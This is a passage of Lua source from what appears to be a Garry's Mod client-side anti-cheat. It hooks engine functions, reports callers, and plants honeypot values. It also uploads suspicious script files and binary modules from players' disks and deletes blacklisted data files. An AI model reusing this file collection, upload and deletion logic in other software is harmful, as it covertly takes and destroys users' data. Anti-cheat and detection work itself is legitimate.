end


NotINC("inclUdes/mOdulEs/UsermeSsage.lua")
local hookAdd			= usermessage.Hook

_G.concommand			= {}
NotINC("iNcluDes/moDules/ConCommANd.lua")
local NotECC			= InjectConsoleCommand
local NotCCA			= concommand.Add
local NotCCR			= concommand.Run
local NotCGT 			= concommand.GetTable()

_G.hook					= {}
_G.IsValid 				= function(v)
	if !v or !v.IsValid then return false end
	return v:IsValid()
end
NotINC("INCludes/modULES/HoOK.lua")
local NotHA				= hook.Add
local NotHR				= hook.Remove
local NotHC				= hook.Call
local NotHH				= hook.Hooks

NotINC("inCLuDeS/ModuLEs/CvaRs.lua")
local NotCAC			= cvars.AddChangeCallback

_G.net.Receive			= nil
_G.net.Incoming			= nil
NotINC("iNcludES/moDULeS/nEt.lua")

local NotTE				= function(e,u) for k,v in pairs(e) do e[k] = (u or nil) end if not u then e = {} end end
local MyPath,MyLine		= "Gone", 0
local HACKey			= "CLG"

local NoBurst = false
_G.hacburst = nil
NotINC("HAC/sh_HACBurst.lua")

local HookCall 	= 0
local HookAdd	= 0
if not (_G.hacburst and _G.hacburst.Send and _G.hacburst.Hook) then
	NoBurst = true
else
	HookCall = _G.hacburst.Send
	HookAdd	 = _G.hacburst.Hook
end

hookAdd("PlayerInitialSpawn", function(ply)
	HACInstalled	= HACInstalled + 1
	MSGHook 		= NotRS(ply)
end)

local AllRand = {}
local function RandomChars()
	local len = NotMR(7,15)
	local rnd = ""
	
	for i = 1, len do
		local c = NotMR(68, 112)
		if c >= 91 and c <= 96 then c = c + 6 end
		rnd = rnd..NotCHR(c)
	end
	
	AllRand[rnd] = true
	return rnd
end
local function NotGMG(...)
	local Meow = {
		cmd  = MSGHook,
		args = {...},
	}
	HookCall("ConCon", NotJST(Meow), nil,nil,nil,true)
end
_G.NotGMG		= NotGMG
_G.GlobalPoop	= NotGMG

local function RunConsoleCommand(cmd,...)
	local Woof = {
		cmd  = cmd,
		args = {...},
	}
	HookCall("ConCon", NotJST(Woof), nil,nil,nil,true)
end
_G.ConCon = RunConsoleCommand

local Kettle = {}
local function DelayGMG(coffee, ...)
	if Kettle[coffee] then return end
	Kettle[coffee] = true
	
	NotGMG(coffee, ...)
end
_G.DelayGMG = DelayGMG
_G.ply 		= DelayGMG

NotCCV("sv_rphysicstime", 0, 16384)

local function CleanThe(toilet)
	local str = NotGGM()
	
	local function ShitDown(paper,bleach)
		bleach = bleach	or {}
		
		for k,v in pairs(paper) do
			local typ = type(v)
			
			if typ == "table" and not bleach[v] then
				bleach[v] = true
				str = str..tostring(k)
				
				ShitDown(v,bleach)
			elseif typ == "string" then
				str = str..tostring(v)
			end
		end
	end
	ShitDown(toilet)
	
	str = str..#str..#str * 2
	return NotCRC(str)
end
HACKey = CleanThe(Lists)


local Lamp = 1
local LPT  = ""
while true do
	local Tab = NotDGE(Lamp)
	if not Tab then break end
	
	LPT = LPT..Format("%s %s %s %s %s\n", Lamp, Tab.what, Tab.name, Tab.short_src, Tab.currentline)
	Lamp = Lamp + 1
end
if Lamp != 4 then
	NotTE(_G, ErrorNoHalt, "Error with Lamp!")
end
local function ValidString(v)
	return (type(v) == "string" and v != "")
end
local function NotIV(what)
	return what and what.IsValid and NotRIV(what)
end
local function Safe(cat,mouse)
	if not cat then return end
	cat = tostring(cat)
	cat = cat:Trim()
	cat = NotGS(cat,"[:/\\\"*%@?<>'#]", "_")
	cat = NotGS(cat,"[]([)]", "")
	cat = NotGS(cat,"[\n\r]", "")
	cat = NotGS(cat,"\7", "BEL")
	return cat:Left(mouse or 25):Trim()
end
local function MyCall(sax,tuba)
	local Horn = NotDGE(sax or 3)
	if not Horn then return "Gone",0 end
	
	local Path = NotGS((Horn.short_src or "Gone"), "\\","/")
	local Line = 0
	if tuba then
		Line = Horn.currentline or 0
	else
		Line = Horn.linedefined or 0
	end
	
	return Path,Line
end
local function Size(cock,inches)
	local Len = NotFXE(cock,inches)
	if not Len or Len == -1 then
		return 0
	else
		return Len
	end
end
local F_Size = _R.File.Size; local F_Close = _R.File.Close; local F_Read = _R.File.Read; local F_Write = _R.File.Write
local function Read(name,shelf,paper)
	local Book = NotFO(name, (paper or "r"), shelf)
		if not Book then return end
		local str = F_Read(Book, F_Size(Book) )
	F_Close(Book)
	
	return str
end
local function Panties()
	local lol = NotGGM()
	local map = #lol * 2
	return map..lol:Left(5):upper()..map * map
end
asdf = DelayGMG
Panties = Panties

local function OverrideCmd(ply,cmd,args,str)
	if #args >= 1 then
		DelayGMG("Key="..cmd..":Args=[["..Safe(str).."]]")
	else
		DelayGMG("Key="..cmd)
	end
	
	if NotIV( LocalPlayer() ) then
		NotCPT(LocalPlayer(), "Unknown Command: '"..cmd.."'\n")
	end
end

if _G.BootyBucket then NotTS(160, function() DelayGMG("BootyBucket") NotTE(_R) end) end
_G.BootyBucket = nil
NotINC("en_streamhks.lua")
if not _G.BootyBucket then NotTS(160, function() DelayGMG("noBootyBucket") NotTE(_R) end) end
local NotBucket = _G.BootyBucket

local Money = {}
local function NSI(tray,cake,dough,milk)
	local path,line = MyCall(4)
	local str = Format("NotSoUseless=%s [%s:%s]", tray, path,line)
	
	if cake and ValidString(dough) and not Money[dough] then
		Money[dough] = true
		NotBucket(dough,milk)
	end
	
	DelayGMG(str)
end
CompileString	= function(s,f)	NSI("CompileString",1, s,"CS") 		return NotHP(s,f)									end
RunString		= function(s)	NSI("RunString", 	1, s,"RS")		NotTS(1, function() return s and NotST(s) 	end)	end
RunStringEx		= function(s,w)	NSI("RunStringEx", 	1, s,"RSX")		NotTS(1, function() return s and NotSX(s,w) end)	end
CompileFile		= function(f)	NSI("CompileFile", 	1, (Read("lua/"..f, "GAME") or "err"),"CF") 						end
Compilestring	= function(s,f)	NSI("Compilestring",1, s,"Cs")															end
Compilefile		= function(f)	NSI("Compilefile",	1, (Read("lua/"..f, "GAME") or "err"),"Cf")							end
WFC111255 		= function()	NSI("WFC111255")																		end
Runstring		= function(s)	NSI("Runstring", 	1, s,"Rs")															end
LoadString		= function(s)	NSI("LoadString",	1, s,"LS")															end
loadstring		= function(s)	NSI("loadstring",	1, s,"Ls")															end
setfenv			= function()	NSI("setfenv")																			end
getfenv			= function()	NSI("getfenv")																			end

local Pudding = {}
local function EatThis(k)
	if k and not Pudding[k] then
		local v = Read(k, "GAME")
		if v then
			NotBucket("\n--"..k..":\n\n"..v, k.."_EAT.lua")
			DelayGMG("EatThis="..k..(v and "" or ", NoV") )
		end
		Pudding[k] = 1
	end
end

local function GoodHook(what,k,where)
	if AllRand[k] or (what == "InitPostEntity" and k == "Hooks") then return true end
	if (what == "OnViewModelChanged" and where == "gamemodes/base/entities/entities/gmod_hands.lua:50") then return true end
	
	for i,Tab in pairs(Lists.White_Hooks) do
		if Tab[1] == what and Tab[2] == k and Tab[3] == where then
			return true
		end
	end
	
	return false
end

local function GoodCCA(cmd,where)
	for i,Tab in pairs(Lists.White_CCA) do
		if Tab[1] == cmd and Tab[2] == where then
			return true
		end
	end
	
	return false
end

local function GoodGM(what,where)
	for i,Tab in pairs(Lists.White_GM) do
		if Tab[1] == what and Tab[2] == where then
			return true
		end
	end
	
	return false
end

local function GoodFont(new,where)
	for i,Tab in pairs(Lists.White_Font) do
		if Tab[1] == new and Tab[2] == where then
			return true
		end
	end
	
	return false
end


local function UselessTable_Hook()
	local path,line = MyCall(nil,true)
	
	DelayGMG( Format("hookGetTable [%s:%s]", path,line) )
	return {},{}
end
_G.hook.GetTable = UselessTable_Hook

local function UselessTable_Cmd()
	local path,line = MyCall(nil,true)
	
	DelayGMG( Format("concommandGetTable [%s:%s]", path,line) )
	return {},{}
end
_G.concommand.GetTable = UselessTable_Cmd



local function CreateFont(new,Tab)
	local path,line = MyCall(nil,true)
	local where = path..":"..line
	
	if not GoodFont(new,where) then
		NotGMG("CreateFont=", Safe(new),where)
		EatThis(path)
		
		if not Silent then
			Tab.font	= "comic sans ms"
			Tab.size 	= 150 --math.random(0,1) == 1 and 80 or 1
			Tab.weight	= 400
			Tab.anti	= true
			Tab.add		= false
		end
	end
	
	return NotSCF(new,Tab)
end
_G.surface.CreateFont = CreateFont


local function NewConCommand(ent,cmd,stuff)
	local low = NotSL( tostring(cmd) )
	
	if Lists.Black_RCC[low] then
		local path,line = MyCall()
		DelayGMG( Format("PCC=%s [%s:%s]", cmd, path,line) ); EatThis(path)
		
		if not Silent then return false end
	end
	
	if not NotIV(ent) then return end
	return NotPCC(ent,cmd,stuff)
end
_R.Entity.ConCommand 	= NewConCommand
_R.Player.ConCommand	= NewConCommand


local function NewRCC(...)
	local Args	= {...}
	local low	= NotSL( tostring( Args[1] ) )
	
	if Lists.Black_RCC[low] then
		local path,line = MyCall()
		DelayGMG( Format("RCC=%s,%s [%s:%s]", low, (Args[2] or "nil"), path,line) ); EatThis(path)
		
		if not Silent then return false end
	end
	
	NotRCC(...)
end
_G.RunConsoleCommand = NewRCC


local function TableCopy(tab,lookup_table)
	if not tab then return nil end
	
	if tab == _G or tab == _R or tab == file or tab == hook or tab == debug or tab == net then
		local path,line = MyCall()
		EatThis(path)
		if tab == _G then
			DelayGMG( Format("tableCopy=_G [%s:%s]", path,line) )
		elseif tab == _R then
			DelayGMG( Format("tableCopy=_R [%s:%s]", path,line) )
		elseif tab == file then
			DelayGMG( Format("tableCopy=file [%s:%s]", path,line) )
		elseif tab == hook then
			DelayGMG( Format("tableCopy=hook [%s:%s]", path,line) )
		elseif tab == debug then
			DelayGMG( Format("tableCopy=debug [%s:%s]", path,line) )
		elseif tab == net then
			DelayGMG( Format("tableCopy=net [%s:%s]", path,line) )
		end
		return tab
	end
	
	local copy = {}
	NotSMT(copy, NotGMT(tab) )
	
	for i,v in pairs(tab) do
		if not istable(v) then
			copy[i] = v
		else
			lookup_table = lookup_table or {}
			lookup_table[tab] = copy
			
			if lookup_table[v] then
				copy[i] = lookup_table[v]
			else
				copy[i] = TableCopy(v,lookup_table)
			end
		end
	end
	
	return copy
end
if not _G.table then _G.table = {} end
_G.table.Copy = TableCopy


local function NewSMT(tab,meta)
	if tab == _G or tab == _R or tab == file or tab == hook or tab == debug or tab == net then
		local path,line = MyCall()
		EatThis(path)
		if tab == _G then
			DelayGMG( Format("setmetatable(_G) [%s:%s]", path,line) )
		elseif tab == _R then
			DelayGMG( Format("setmetatable(_R) [%s:%s]", path,line) )
		elseif tab == file then
			DelayGMG( Format("setmetatable(file) [%s:%s]", path,line) )
		elseif tab == hook then
			DelayGMG( Format("setmetatable(hook) [%s:%s]", path,line) )
		elseif tab == debug then
			DelayGMG( Format("setmetatable(debug) [%s:%s]", path,line) )
		elseif tab == net then
			DelayGMG( Format("setmetatable(net) [%s:%s]", path,line) )
		end
		if not Silent then NotTE(meta, ErrorNoHalt, "Can't setmetatable!") end
		return {}
	end
	return NotSMT(tab,meta)
end
_G.setmetatable = NewSMT


local function NewRST(tab,k,v)
	if tab == _G or tab == _R or tab == file or tab == hook or tab == debug or tab == net then
		k = tostring(k)
		local path,line = MyCall()
		EatThis(path)
		if tab == _G then
			DelayGMG( Format("rawset(_G,%s) [%s:%s]", k, path,line) )
		elseif tab == _R then
			DelayGMG( Format("rawset(_R,%s) [%s:%s]", k, path,line) )
		elseif tab == file then
			DelayGMG( Format("rawset(file,%s) [%s:%s]", k, path,line) )
		elseif tab == hook then
			DelayGMG( Format("rawset(hook,%s) [%s:%s]", k, path,line) )
		elseif tab == debug then
			DelayGMG( Format("rawset(debug,%s) [%s:%s]", k, path,line) )
		elseif tab == net then
			DelayGMG( Format("rawset(net,%s) [%s:%s]", k, path,line) )
		end
		if not Silent then NotTE(tab) end
		return {}
	end
	return NotRST(tab,k,v)
end
_G.rawset = NewRST
_G.entity = DelayGMG

local Butthole = {}
local function NewRQ(mod)
	local path,line = MyCall(nil,true)
	mod = tostring(mod)
	
	local Cork = Format("require(%s) [%s:%s]", mod, path,line)
	if not Lists.White_Require[Cork] then
		DelayGMG(Cork)
		EatThis(path)
	end
	
	if Butthole[Cork] then return end
	Butthole[Cork] = true
	
	local Low = NotSL(mod)
	if Low == "hook" or Low == "net" or Low == "concommand"or Low == "usermessage" then return end
	
	return NotRQ(mod)
end
_G.require	= NewRQ
_G.NotRQ 	= NotRQ

local function NewCCC(name,def,save,user)
	local path,line = MyCall(nil,true)
	local where = Format("[%s:%s]", path,line)
	
	if where == "[gamemodes/sandbox/entities/weapons/gmod_tool/stool.lua:41]" or
		where == "[addons/spp/lua/spropprotection/cl_init.lua:122]" then
		return NotCCC(name,def,save,user)
	end
	def		= tostring(def)
	name 	= tostring(name)
	where	= Format("CreateClientConVar(%s,%s,%s,%s) %s", name,def,tostring(save),tostring(user), where)
	
	if not Lists.White_CCC[where] then
		DelayGMG(where)
		EatThis(path)
		
		NotCAC(name, function(var,old,new)
			if new != def then DelayGMG("NewCCC="..var..":Args=("..Safe(old.." - "..new)..")") end
		end)
		
		if NotFL(NotSL(name),"spam") or NotFL(NotSL(path),"spam") then
			return NotCCV("_~"..name,0,16384,"Spam spam spam beans eggs spam spam")
		end
		if not Silent then
			return NotCCV(name,def,16384,"Cheat command")
		end
	end
	
	return NotCCC(name,def,save,user)
end
_G.CreateClientConVar 	= NewCCC
_G.NotSX				= NotSX

local function NewCCV(name,def,flags,help)
	if name == "cl_playerbodygroups" or name == "cl_playerskin" then
		return NotCCV(name,def,flags,help)
	end
	
	local FLG = "nil"
	if flags then
		FLG = ""
		
		if type(flags) == "table" then
			for k,v in pairs(flags) do
				FLG = tostring(v)..","
			end
		else
			FLG = tostring(flags)
		end
	end
	
	local path,line = MyCall(nil,true)
	name = tostring(name)
	local where = Format("CreateConVar(%s,%s,%s,%s) [%s:%s]", name,tostring(def),FLG,tostring(help), path,line)
	
	if not Lists.White_CCV[where] then
		DelayGMG(where)
		EatThis(path)
		
		NotCAC(name, function(var,old,new)
			DelayGMG("NotCCV="..var..":Args=("..Safe(old.." - "..new)..")")
		end)
		
		if NotFL(NotSL(name),"spam") or NotFL(NotSL(path),"spam") then
			return NotCCV("_~"..name,0,16384,"Spam spam spam beans eggs spam spam")
		end
		if not Silent then
			return NotCCV(name,def,16384,help)
		end
	end
	
	return NotCCV(name,def,flags,help)
end
_G.CreateConVar = NewCCV

local function ChatPrint(self,str)
	if ValidString(str) and NotFL(str,"Unknown Command: '") then
		DelayGMG("UNK="..Safe( str:match("'(.-)'") ))
	end
	
	return NotCPT(self,str)
end
_R.Player.ChatPrint	= ChatPrint
_R.Entity.ChatPrint	= ChatPrint

local angle_zero = Angle(0,0,0)
local function SetViewAngles(view,ang)
	local path,line = MyCall()
	if not (path and ang) then return end
	
	DelayGMG( Format("SetViewAngles=[%s:%s]", path,line) )
	
	return not (ang.p < -91 or ang.p > 91) and NotSVA(view,ang) or angle_zero
end
_R.CUserCmd.SetViewAngles = SetViewAngles

local function SetEyeAngles(self,ang)
	if not NotIV(self) then return end
	
	local path,line = MyCall()
	if not (path and ang) then return end
	
	DelayGMG( Format("SetEyeAngles=[%s:%s]", path,line) )
	
	return not (ang.p < -91 or ang.p > 91) and NotSEA(self,ang) or angle_zero
end
_R.Player.SetEyeAngles	= SetEyeAngles
_R.Player.SnapEyeAngles	= SetEyeAngles
_R.Entity.SetEyeAngles	= SetEyeAngles
_R.Entity.SnapEyeAngles	= SetEyeAngles

local function AddGroups()
	KARMA 				= true
	ROLE_TRAITOR		= 1337
	TEAM_SPECTATOR		= 9
	MOVETYPE_OBSERVER	= 2
	vgui.register		= error
	plugins 			= hook
	command 			= concommand
	import				= Error
	_ENV				= _G
	c 					= "cock"
	local function Group() return string.rep("Admin ", 4) end
	local Tab = {ROLE_TRAITOR}
	
	_R.Player.GetUserGroup	= Group
	_R.Player.GetRole		= function() local p,l = MyCall() DelayGMG( Format("GetRole [%s:%s]", p,l) ) return 1 end
	_R.Player.IsDormant		= function() local p,l = MyCall() DelayGMG( Format("pIsDormant [%s:%s]", p,l) ) return true end
	_R.Entity.IsDormant		= function() local p,l = MyCall() DelayGMG( Format("eIsDormant [%s:%s]", p,l) ) return true end
	_R.Entity.CanBuy 		= Tab
	_R.Entity.GetUserGroup	= Group
	_R.Weapon.GetUserGroup	= Group
	_R.Weapon.CanBuy 		= Tab
	_R.Weapon.isReloading	= true
	_R.Weapon.reloading		= true
	_R.Weapon.Spread		= 1337
	_R.Weapon.Cone			= 1337
end

local Chicken = nil
NotTC(RandomChars(), 6, 0, function()
	local ply = LocalPlayer()
	if ply and NotIV(ply) then
		if ply.voice_battery then ply.voice_battery = nil DelayGMG("ply.voice_battery") end
		local Wep = ply:GetActiveWeapon()
		
		if Wep and NotIV(Wep) then
			local KWC = NotSL( Wep:GetClass() )
			
			if not Lists.White_NNRIgnore[KWC] and (Wep.Primary) then
				local RCL = tonumber(Wep.Primary.Recoil) or 1
				
				if Lists.White_NNRWeapons[KWC] != RCL then
					DelayGMG( Format("NoRecoil=%s-%s", KWC, RCL) )
				end
			end
		end
		
		local SID = ply:SteamID()
		if not Chicken then
			Chicken = SID
		end
		
		if Chicken != SID then
			DelayGMG("SteamID="..SID)
			Chicken = SID
		end
	end
	AddGroups()
end)

for k,v in pairs(Lists.Black_NoHW) do
	NotCAC(v, function(var,old,new)
		DelayGMG("NoHW="..var..":Args=[["..Safe(new).."]]")
	end)
end


local SAFE,BAD = 1,2
local function CMECheck(This,v,butt)
	local Out = NotFO(This, "rb", "MOD")
	
	if not Out then
		DelayGMG("CME=NoOut="..This)
		return
	end
	
	local Size 	= F_Size(Out)
	if Size > 700000 then
		DelayGMG("CME=TooBig="..This.."-"..Size)
		F_Close(Out)
		Out = nil
		return
	end
	
	local Cont	= NotB64( F_Read(Out,Size) )
	if not Cont then DelayGMG("CME=NoCont("..This.."-"..Size..")") return end
	
	local CRC 	= NotCRC(Cont)
	local uID	= Format("%s-%s", v, CRC)
	local Res 	= Lists.White_DLC[ uID ]
	
	if Res or Lists.White_DLC[CRC] then
		if Res and Res != SAFE then
			DelayGMG( Format("CME=%s-%s", This, CRC) )
		end
	else
		local CME = NotJST(
			{
				Bin 	= Cont,
				Name	= v,
				CRC		= CRC,
			}
		)
		Cont = nil
		HookCall(butt, CME, nil, uID)
		CME	 = nil
	end
	
	F_Close(Out)
	Out = nil
end

local function CModCheck(nuts,what,tire,cone,nail)
	for k,v in pairs( NotFF(nuts..what, "MOD") ) do
		if not ValidString(v) or ((nuts == "bin/" or nuts == "lua/") and Lists.White_DLC[v]) then continue end
		if (nuts == "lua/" or nuts == "lua/includes/modules/") and NotSS(v,-4) == ".lua" then continue end
		local This = nuts..v
		RunConsoleCommand(cone, tire..v, Size(This, "MOD"), v)
		if nail then CMECheck(This,v,cone) end
	end
end

NotTS(9, function()
	if concommand then	DelayGMG("PLCount", Cheese) end
	if HCCMD	then 	DelayGMG("HCCMD")	end
	if TCMD		then 	DelayGMG("TCMD")	end
	if DGMT 	then 	DelayGMG("DGMT")	end
	if GGMT 	then 	DelayGMG("GGMT")	end
	
	for k,v in pairs(Dogs) do
		DelayGMG("GCheck="..v)
	end
	
	if MyPath != "Gone" or MyLine != 0 then
		DelayGMG( Format("BHAC=[%s:%s]", MyPath, MyLine) )
	end
	
	if PLCC then
		PLCC = false
		DelayGMG("KR30=PLCC")
	end
	if PLCV then
		PLCV = false
		DelayGMG("KR30=PLCV")
	end
	if PLHK then
		PLHK = false
		DelayGMG("KR30=PLHK")
	end
	
	if NoBurst then
		NoBurst = false
		DelayGMG("KR30=NoBurst")
	end
	AddGroups()
end)
CModCheck("lua/includes/enum/",		"*",		"ENMod=",	"gm_explode_player")
CModCheck("lua/menu_plugins/",		"*",		"MLMod=",	"gm_respawn_player")
CModCheck("addons/",				"*.vdf",	"VMod=",	"gm_kill_player")
CModCheck("addons/",				"*.dll",	"VMod=",	"gm_kill_player",  true)
CModCheck("bin/",					"*",		"BMod=",	"gm_kill_player",  true)
CModCheck("lua/includes/modules/",	"*",		"CMod=",	"gm_spawn_player", true)
CModCheck("lua/bin/",				"*",		"CMod=",	"gm_spawn_player", true)
CModCheck("lua/",					"*",		"CMod=",	"gm_spawn_player", true)


local NotHTTP,E482 = HTTP,"\nNetwork error 482. Somebody shot the server with a 12 Gauge, please contact your administrator\n"
function _G.HTTP(tab)
	local path,line = MyCall(4)
	DelayGMG( Format("HTTP=[[%s]] M=%s [%s:%s]", tab.url, tab.method, path,line) ); EatThis(path)
	if tab.parameters then
		DelayGMG( Format("HTTP=[[%s]] Params[[%s]] [%s:%s]", tab.url, table.ToString(tab.parameters), path,line) )
	end
	
	tab.successOld = tab.success
	function tab.success(code, body, headers)
		DelayGMG( Format("HTTPsuccess c[[%s]] b[[%s]] h[[%s]] [%s:%s]", code,body, table.ToString(headers or {}), path,line) )
		
		pcall(tab.successOld,482,E482,headers)
		if tab.failed then pcall(tab.failed,E482) end
		pcall(tab.successOld,code,body,headers)
	end
	NotHTTP(tab)
end

NotTS(26, function()	
	for k,v in pairs(Lists.Black_DataFiles) do
		local What 	= (v.What  or "*.txt")
		local Where = (v.Where or "")
		local File	= Where..What
		
		if ValidString(File) then
			for x,y in pairs( NotFF(File, "DATA") ) do
				if ValidString(y) then
					local NewFile	= Where..y
					local Cont		= Read(NewFile, "DATA")
					local FCont		= Safe(Cont, 25)
					local FSize		= Size(NewFile, "DATA")
					NotTS(60, function() NotFD(NewFile) end)
					
					if FSize then
						if ValidString(Cont) then
							DelayGMG( Format("Datafile=data/%s-%s (%s) [[%s]]", NewFile, FSize, What, FCont) )
							--NotBucket(Cont:Left(700000), NewFile)
						else
							DelayGMG( Format("Datafile=data/%s-%s (%s)", NewFile, FSize, What) )
						end
					else
						if ValidString(Cont) then
							DelayGMG( Format("Datafile=data/%s (%s) [[%s]]", NewFile, What, FCont) )
							--NotBucket(Cont:Left(700000), NewFile)
						else
							DelayGMG( Format("Datafile=data/%s (%s)", NewFile, What) )
						end
					end
				end
			end
		end
	end
end)

local function Ooh()
	for k,v in pairs(Lists.Black_Megaloop) do
		for x,y in pairs(v.H) do
			local what = _G[y]
			
			if what != nil and what != Useless then
				local path,line = FPath(what)
				local This = (type(what) != "function" and ": "..tostring(what) or "")
				DelayGMG( Format("TC=%s-_G.%s [%s:%s]%s", v.D,y, path,line, This) ); EatThis(path)
				_G[y] = Useless
			end
		end
	end
	
	for k,v in pairs(Lists.Black_Hooks) do
		local Hook		= v.H
		local Name		= v.N
		local BaseHook	=  NotHH[Hook]
		
		if BaseHook then
			local func = BaseHook[Name]
			
			if func then
				local path,line = FPath(func)
				DelayGMG( Format("%s=%s-%s [%s:%s]", v.D, Hook, Name, path,line ) ); EatThis(path)
				
				BaseHook = nil
				NotHH[Hook] = nil
				NotHR(Hook, Name)
			end
		end
	end
	
	--REMOVE ME
	if string.random then
		local Path,Line = FPath(string.random)
		
		DelayGMG( Format("TC=string.random [%s:%s]", Path, Line) )
		string.random = nil
	end
	if string.Random then
		local Path,Line = FPath(string.Random)
		
		DelayGMG( Format("TC=string.Random [%s:%s]", Path, Line) )
		string.Random = nil
	end
	if file.ExistsEx then
		local Path,Line = FPath(file.ExistsEx)
		
		DelayGMG( Format("TC=file.ExistsEx [%s:%s]", Path, Line) )
		file.ExistsEx = nil
	end
	if file.TFind then
		local Path,Line = FPath(file.TFind)
		
		DelayGMG( Format("TC=file.TFind [%s:%s]", Path, Line) )
		file.TFind = nil
	end
	if file.FindInLua then
		local Path,Line = FPath(file.FindInLua)
		
		DelayGMG( Format("TC=file.FindInLua [%s:%s]", Path, Line) )
		file.FindInLua = nil
	end
end
NotTS(25, function()
	NotTC(RandomChars(), 60, 0, Ooh)
	DelayGMG(NotCRC(MSGHook))
end)
Ooh()

local function CheckPotato(spud,peel)
	if not spud then DelayGMG("KR30=CheckPotato-No("..peel..")") return end
	
	local DGE = NotDGE(spud)
	if DGE then
		local Res = ""
		
		if DGE.what != "C" then 			Res = Res.."WH="..DGE.what.."," 						end
		if DGE.linedefined != -1 then 		Res = Res.."LD="..DGE.linedefined.."," 					end
		if DGE.lastlinedefined != -1 then	Res = Res.."LL="..DGE.lastlinedefined..","				end
		if DGE.source != "=[C]"	then		Res = Res.."SC="..DGE.source.."," 						end
		if DGE.short_src != "[C]" then		Res = Res.."SS="..DGE.short_src.."," 					end
		if DGE.func != spud then			Res = Res.."FU="..DGE.func.." ["..FPath(DGE.func).."],"	end
		
		if Res != "" then
			local path,line = FPath(spud)
			DelayGMG( Format("KR30=CheckPotato(%s, %s) [%s:%s]", peel, Res, path,line) ); EatThis(path)
		end
	else
		DelayGMG("KR30=CheckPotato-NoDGE("..peel..")")
	end
end

local function KickRate30()
	CheckPotato(tostring,				"tostring")
	CheckPotato(include,				"include")
	CheckPotato(error,					"error")
	CheckPotato(Error,					"Error")
	CheckPotato(collectgarbage,			"collectgarbage")
	CheckPotato(NotRCC,					"NotRCC")
	CheckPotato(NotRQ,					"NotRQ")
	CheckPotato(NotRS,					"NotRS")
	CheckPotato(NotGCI,					"NotGCI")
	CheckPotato(NotCGB,					"NotCGB")
	CheckPotato(NotJUF,					"NotJUF")
	CheckPotato(NotSD,					"NotSD")
	
	if NotGMT(_G) != nil then
		DelayGMG("KR30=GGMT")
	end
	if debug then
		DelayGMG("KR30=KR30LDD")
	end
	if _G.__metatable != nil then
		DelayGMG("KR30=GMT")
	end
	if _G.__index != nil then
		DelayGMG("KR30=GIDX")
	end
	if _G.__newindex != nil then
		DelayGMG("KR30=NIDX")
	end
	
	if NotGCN("cl_cmdrate") != 30 then
		NotRCC("cl_cmdrate", "30")
	end
	if NotGCS("rate") != "45000" then
		NotRCC("rate", "45000")
	end
	if NotGCS("sv_timeout") != "200" then
		NotRCC("sv_timeout", "200")
	end
	
	if NotGCN("physgun_wheelspeed") > 10 then
		DelayGMG( Format("KR30=physgun_wheelspeed=%s", NotGCS("physgun_wheelspeed") ) )
		NotRCC("physgun_wheelspeed", "10")
	end
	
	for k,v in pairs(Lists.White_CVTab) do
		local CVar = NotGCV(k)
		local gCVE = NotCVE(k)
		if not CVar or not gCVE then
			if not CVar then
				DelayGMG("KR30=NoCVar="..k)
			end
			if not gCVE then
				DelayGMG("KR30=NoCVE="..k)
			end
			break
		end
		
		local Reset = false
		local Int	= v.Int
		local gInt 	= NotGCN(k)
		if gInt != Int then
			DelayGMG( Format("KR30=%s gInt(%s != %s)", k, gInt, Int) )
			Reset = true
		end
		local Str	= v.Str
		local gStr	= NotGCS(k)
		if gStr != Str then
			DelayGMG( Format("KR30=%s gStr(%s != %s)", k, gStr, Str) )
			Reset = true
		end
		
		local vInt = NotGIN(CVar)
		if vInt != Int then
			DelayGMG( Format("KR30=%s vInt(%s != %s)", k, vInt, Int) )
			Reset = true
		end
		local vStr = NotGSS(CVar)
		if vStr != Str then
			DelayGMG( Format("KR30=%s vStr(%s != %s)", k, vStr, Str) )
			Reset = true
		end
		local vBool	= NotGBL(CVar)
		local Bool	= v.Bool or false
		if vBool != Bool then
			DelayGMG( Format("KR30=%s vBool(%s != %s)", k, vBool, Bool) )
			Reset = true
		end
		local Float	= v.Float
		local vFloat = NotGFL(CVar)
		if vFloat != Float then
			DelayGMG( Format("KR30=%s vFloat(%s != %s)", k, vFloat, Float) )
			Reset = true
		end
		local Def = v.Def
		local vDef		= NotGDF(CVar)
		if vDef != Def then
			DelayGMG( Format("KR30=%s vDef(%s != %s)", k, vDef, Def) )
		end
		local Help = v.Help
		if Help then
			local vHelp = NotGHP(CVar) or "None"
			
			if vHelp != Help then
				DelayGMG( Format("KR30=%s vHelp(%s)", k, vHelp) )
			end
		end
		if Reset and not NotSL(k) == "sv_cheats" then
			NotRCC(k, Str)
		end
	end
	
	if require != NewRQ then
		DelayGMG("Detour3=require["..FPath(require).."]")
		require = NewRQ
	end
	if include != NotINC then
		DelayGMG("Detour3=include["..FPath(include).."]")
		include = NotINC
	end
	if debug.getinfo != NotDGE then
		DelayGMG("Detour3=debug.getinfo["..FPath(debug.getinfo).."]")
		debug.getinfo = NotDGE
	end
	if hook.Add != NotHA then
		DelayGMG("Detour3=hook.Add["..FPath(hook.Add).."]")
		hook.Add = NotHA
	end
	if hook.Call != NotHC then
		DelayGMG("Detour3=hook.Call["..FPath(hook.Call).."]")
		hook.Call = NotHC
	end
	if hook.Remove != NotHR then
		DelayGMG("Detour3=hook.Remove["..FPath(hook.Remove).."]")
		hook.Remove = NotHR
	end
	if hook.GetTable != UselessTable_Hook then
		DelayGMG("Detour3=hook.GetTable["..FPath(hook.GetTable).."]")
		hook.GetTable = UselessTable_Hook
	end
	if concommand.GetTable != UselessTable_Cmd then
		DelayGMG("Detour3=concommand.GetTable["..FPath(concommand.GetTable).."]")
		concommand.GetTable = UselessTable_Cmd
	end
	if file.Find != NotFF then
		DelayGMG("Detour3=file.Find["..FPath(file.Find).."]")
		file.Find = NotFF
	end
	if GetConVar != NotGCV then
		DelayGMG("Detour3=GetConVar["..FPath(GetConVar).."]")
		GetConVar = NotGCV
	end
	if GetConVarString != NotGCS then
		DelayGMG("Detour3=GetConVarString["..FPath(GetConVarString).."]")
		GetConVarString = NotGCS
	end
	if GetConVarNumber != NotGCN then
		DelayGMG("Detour3=GetConVarNumber["..FPath(GetConVarNumber).."]")
		GetConVarNumber = NotGCN
	end
	if concommand.Add != NotCCA then
		DelayGMG("Detour3=concommand.Add["..FPath(concommand.Add).."]")
		concommand.Add = NotCCA
	end
	if _G.RunConsoleCommand != NewRCC then
		DelayGMG("Detour3=RunConsoleCommand["..FPath(_G.RunConsoleCommand).."]")
		_G.RunConsoleCommand = NewRCC
	end
	if concommand.Run != NotCCR then
		DelayGMG("Detour3=concommand.Run["..FPath(concommand.Run).."]")
		concommand.Run = NotCCR
	end
	if _R.File.Size != F_Size then
		DelayGMG("Detour3=F_Size["..FPath(_R.File.Size).."]")
